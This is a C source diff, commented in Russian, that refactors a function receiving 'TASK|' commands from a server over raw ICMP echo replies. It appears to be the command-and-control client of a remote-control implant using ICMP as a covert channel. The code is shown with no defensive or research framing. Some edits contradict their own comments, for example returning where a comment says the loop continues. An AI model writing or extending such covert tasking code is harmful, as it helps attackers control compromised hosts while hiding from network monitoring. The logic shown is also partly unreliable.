@@ -3,11 +3,11 @@
 
 #include <stdio.h>
 #include <string.h>
-#include <time.h>
 #include <unistd.h>
 #include <inttypes.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
+#include <sys/time.h>
 #include <netinet/ip_icmp.h>
 
 #define ICMP_MAX_ITERATIONS 10
@@ -143,15 +143,13 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
     //получение нужного пакета(даем 10 итераций чтобы пропустить ненужные пакеты)
     int attempts_left = ICMP_MAX_ITERATIONS;
     while(attempts_left > 0) {
-        attempts_left--; 
         memset(packet_answer, 0, sizeof(packet_answer));
         int recv_len = recvfrom(current_sockfd, packet_answer, sizeof(packet_answer), 0, (struct sockaddr*)&from, &from_len);
         
-        if(recv_len <= 0) {
-            printf("[-/ICMP] Error recvfrom.\n");
-            return 1;
+        if(recv_len <= 0 || recv_len < (int)sizeof(struct iphdr)) {
+            return 1; //идем на следующую итерацию получения пакета, так как ничего не пришло либо битый пакет
         } else {
-            //анализ
+            //анализ полученных данных
             //данные приходят в сырой сокет с ip заголовком, который тоже надо обработать
             struct iphdr* ip = (struct iphdr*)packet_answer;
             int ip_hdr_len = ip->ihl * 4; //длина ip заголовка (ед. изм. = 4 байта)
@@ -169,13 +167,11 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
                 continue;
             }
 
-            if(icmp_hdr->type == ICMP_ECHOREPLY && ntohs(icmp_hdr->un.echo.id) == ICMP_ID) {
-                attempts_left = 0; 
-                printf("[+/ICMP] Recevied task from server (%s).\n", inet_ntoa(from.sin_addr));
+            if((icmp_hdr->type == ICMP_ECHOREPLY) && (ntohs(icmp_hdr->un.echo.id) == ICMP_ID)) { 
                 
-                int data_from_len = recv_len - ip_hdr_len - sizeof(struct icmphdr);
+                int data_from_len = recv_len - ip_hdr_len - (int)sizeof(struct icmphdr);
                 if(data_from_len > 0) {
-                    char* data_from = packet_answer + ip_hdr_len + sizeof(struct icmphdr);
+                    char* data_from = packet_answer + ip_hdr_len + (int)sizeof(struct icmphdr);
                     
                     //парсинг полученных данных
                     if(strncmp(data_from, "TASK|", 5) == 0) {
@@ -185,7 +181,7 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
                         if(pos != NULL) {
                             if(strncmp(data_from, "null", 4) == 0) {
                                 printf("[+/ICMP] На данный момент задач для выполнения нет.\n");
-                                return 0;
+                                return 1;
                             }
                             //длина до разделителя
                             size_t len = pos - data_from;
@@ -218,8 +214,7 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
                             return 1;
                         }
                     } else {
-                        printf("[-/ICMP] Invalid data(header).\n");
-                        return 1;
+                        continue;
                     }
                 } else {
                     printf("[-/ICMP] The data is missing.\n");
@@ -227,7 +222,9 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
                 }
             }
         }
+        attempts_left--;
     }
+    printf("[+/ICMP] No responce from the server.\n");
     return 1;
 }
 
